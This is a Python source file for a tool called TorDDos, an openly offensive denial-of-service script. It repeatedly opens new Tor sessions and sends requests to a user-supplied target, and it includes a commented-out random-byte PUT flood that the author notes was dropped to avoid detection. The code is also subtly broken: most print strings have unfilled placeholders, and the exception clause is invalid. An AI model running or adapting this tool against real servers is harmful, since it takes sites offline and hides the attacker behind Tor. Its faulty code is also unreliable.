#!/usr/bin/env python
# -*- coding: utf-8 -*-
# TorDDos (https://www.github.com/R3nt0n/torddos) (14/07/2019)
# R3nt0n  (https://www.github.com/R3nt0n)

import datetime
import sys

from lib.color import color
from lib.tor import Tor


def main():
    counter = 0
    try:
        while counter < max_attempts:
            tor = Tor()
            if not tor.tor_installed():
                print(u'{}[!]{} Tor is not installed. Exiting...')
                sys.exit(1)
            else:
                # Initial timestamp and increment the counter
                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
                counter += 1

                # Init a new Tor session
                session = tor.new_session()
                print(u'{}[!]{} New Tor session initialized...')
                print(u'\n{}[+]{} Target: {}{}{}')

                # Getting data from the server
                print(u'{}[*]{} Getting data from {}...')
                session.get(target)
                # Putting data (omitted, maybe it makes detection easier)
                # random_bytes = random._urandom(1490)
                # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
                # session.put(target, random_bytes)
                print(u'{}[*]{} Target {} was attacked succesfully')

    except KeyboardInterrupt: pass
    except Exception(Exception):
        print(u'\n{}[!]{} An error has occurred:')
        print(u'{}{}{}')

    finally:
        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
        print(u'{}[+]{} Time elapsed:\t{}')
        print(u'{}[+]{} Number of requests:\t{}')
        print(u'{}[!]{} Stopping Tor...')
        tor.stop_tor()
        print(u'{}[!]{} Exiting...\n')
        sys.exit(0)


if __name__ == '__main__':
    # Processing args
    from lib.args import *
    args = parser.parse_args()
    target = args.target
    max_attempts = args.max_attempts
    # Print help and exit when it runs without target arg
    if not target:
        parser.print_help(sys.stdout); sys.exit(2)
    # Run the main execution
    main()
